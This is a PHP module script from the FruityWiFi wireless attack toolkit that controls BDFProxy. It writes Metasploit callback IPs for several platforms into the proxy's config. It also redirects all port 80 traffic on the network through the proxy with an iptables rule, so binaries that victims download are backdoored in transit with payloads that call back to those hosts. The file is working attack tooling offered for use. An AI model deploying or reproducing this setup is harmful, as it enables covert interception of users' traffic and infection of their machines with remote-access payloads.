<? 
/*
    Copyright (C) 2013-2015 xtr4nge [_AT_] gmail.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
?>
<?
include "../../../login_check.php";
include "../../../config/config.php";
include "../_info_.php";
include "../../../functions.php";
include "options_config.php";

// Checking POST & GET variables...
if ($regex == 1) {
    regex_standard($_GET["service"], "../msg.php", $regex_extra);
    regex_standard($_GET["action"], "../msg.php", $regex_extra);
    regex_standard($_GET["page"], "../msg.php", $regex_extra);
    regex_standard($io_action, "../msg.php", $regex_extra);
    regex_standard($_GET["mac"], "../msg.php", $regex_extra);
    regex_standard($_GET["install"], "../msg.php", $regex_extra);
}

$service = $_GET['service'];
$action = $_GET['action'];
$page = $_GET['page'];
$mac =  strtoupper($_GET['mac']);
$install = $_GET['install'];
$port = 9998;

if($service == $mod_name) {
    
    if ($action == "start") {
        
	// START MODULE
        
        // COPY LOG
        if ( 0 < filesize( $mod_logs ) ) {
            $exec = "cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
            exec_fruitywifi($exec);
            
            $exec = "echo '' > $mod_logs";
            exec_fruitywifi($exec);
        }
	
		// SET BDFPROXY CONFIG FILE	
	    $exec = "/bin/sed -i 's/HOST =.*# LinuxIntelx86 Metasploit IP/HOST = $opt_LinuxIntelx86_ip # LinuxIntelx86 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);
		
		$exec = "/bin/sed -i 's/HOST =.*# LinuxIntelx64 Metasploit IP/HOST = $opt_LinuxIntelx64_ip # LinuxIntelx64 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);
		
		$exec = "/bin/sed -i 's/HOST =.*# WindowsIntelx86 Metasploit IP/HOST = $opt_WindowsIntelx86_ip # WindowsIntelx86 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);
		
		$exec = "/bin/sed -i 's/HOST =.*# WindowsIntelx64 Metasploit IP/HOST = $opt_WindowsIntelx64_ip # WindowsIntelx64 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);	
		
		$exec = "/bin/sed -i 's/HOST =.*# MachoIntelx86 Metasploit IP/HOST = $opt_MachoIntelx86_ip # MachoIntelx86 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);
		
		$exec = "/bin/sed -i 's/HOST =.*# MachoIntelx64 Metasploit IP/HOST = $opt_MachoIntelx64_ip # MachoIntelx64 Metasploit IP/g' bdf-proxy/bdfproxy.cfg";
		$output = exec_fruitywifi($exec);
	
	
		$exec = "$bin_iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
		exec_fruitywifi($exec);
	
		$exec = "cd bdf-proxy; stdbuf -oL python bdf_proxy.py >> $mod_logs &";
		
        exec_fruitywifi($exec);
		
    } else if($action == "stop") {
	
		// STOP MODULE
        
		$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
		exec_fruitywifi($exec);
		
		$exec = "ps aux|grep bdf_proxy | grep -v grep | awk '{print $2}'";
		exec($exec,$output);
		
		$exec = "kill " . $output[0];
		exec_fruitywifi($exec);
	
		// COPY LOG
        if ( 0 < filesize( $mod_logs ) ) {
            $exec = "cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
            exec_fruitywifi($exec);
            
            $exec = "echo '' > $mod_logs";
            exec_fruitywifi($exec);
        }
	
    }

}

if ($install == "install_$mod_name") {

    $exec = "chmod 755 install.sh";
    exec_fruitywifi($exec);
    
    $exec = "$bin_sudo ./install.sh > $log_path/install.txt &";
    exec_fruitywifi($exec);

    header("Location: ../../install.php?module=$mod_name");
    exit;
}

$filename = $file_users;

if ($page == "status") {
    header('Location: ../../../action.php');
} else {
    header("Location: ../../action.php?page=$mod_name");
}

?>